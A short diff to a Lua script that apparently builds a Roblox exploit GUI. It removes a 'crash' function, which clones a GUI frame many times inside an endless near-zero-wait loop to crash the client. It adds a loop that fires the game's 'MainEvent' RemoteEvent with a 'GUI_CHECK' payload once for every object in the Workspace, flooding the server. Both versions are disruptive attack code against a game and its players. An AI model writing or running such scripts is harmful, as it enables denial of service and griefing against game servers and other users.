@@ -87,28 +87,8 @@ UITextSizeConstraint_4.MaxTextSize = 66
 UIAspectRatioConstraint.Parent = DONOTTOUCHTHISFRAME
 UIAspectRatioConstraint.AspectRatio = 1.126
 
-crash = function()
-    local newframe = game.StarterGui.MainScreenGui.AreYouSure:Clone()
-    
-    newframe.Parent = game.Players.LocalPlayer.PlayerGui
-        end
-    
-    while true do
-    wait(.000000000000001)
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    crash()
-    end
+local AreYouSure = Instance.new('Animation', game.Players.LocalPlayer.PlayerGui)
+AreYouSure.Name = 'AreYouSure'
+for i,v in pairs(game.Workspace:GetDescendants()) do
+    game:GetService("ReplicatedStorage").MainEvent:FireServer("GUI_CHECK",game:GetService("Players").LocalPlayer.PlayerGui.AreYouSure,"AreYouSure / extra information:  / Are You Sure? / YES / NO")
+end
